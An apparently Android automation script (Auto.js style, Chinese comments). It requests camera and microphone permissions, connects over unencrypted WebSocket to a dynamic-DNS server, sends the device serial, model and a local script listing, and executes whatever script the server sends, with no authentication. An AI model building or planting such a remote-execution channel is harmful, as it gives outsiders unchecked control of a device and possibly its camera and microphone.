let ws = null;

// 请求权限
let permissions = ["android.permission.CAMERA", "android.permission.RECORD_AUDIO"];
runtime.requestPermissions(permissions);

function connectToServer() {
    // 服务器地址
    const serverUrl = 'ws://k2o3.tpddns.cn:22101/ws/' + device.getSerialNumber();

    // 创建WebSocket连接
    ws = new WebSocket(serverUrl);

    ws.onopen = function(event) {
        console.log('Connected to server');
        // 发送设备型号
        ws.send(JSON.stringify({model: device.model}));
        // 发送脚本列表
        const scriptList = files.listDir("/sdcard/脚本/");
        ws.send(JSON.stringify({script_list: scriptList}));
    };

    ws.onmessage = function(event) {
        console.log('Received message: ' + event.data);
        const data = JSON.parse(event.data);
        if (data.script) {
            // 执行接收到的脚本
            try {
                engines.execScript("remote_script", data.script);
            } catch (e) {
                console.error("Error executing script: " + e);
            }
        }
    };

    ws.onerror = function(event) {
        console.error('WebSocket error: ' + event);
    };

    ws.onclose = function(event) {
        console.log('Disconnected from server');
        // 尝试重新连接
        setTimeout(connectToServer, 5000);
    };
}

// 启动连接
connectToServer();

// 保持脚本运行
setInterval(()=>{}, 1000);
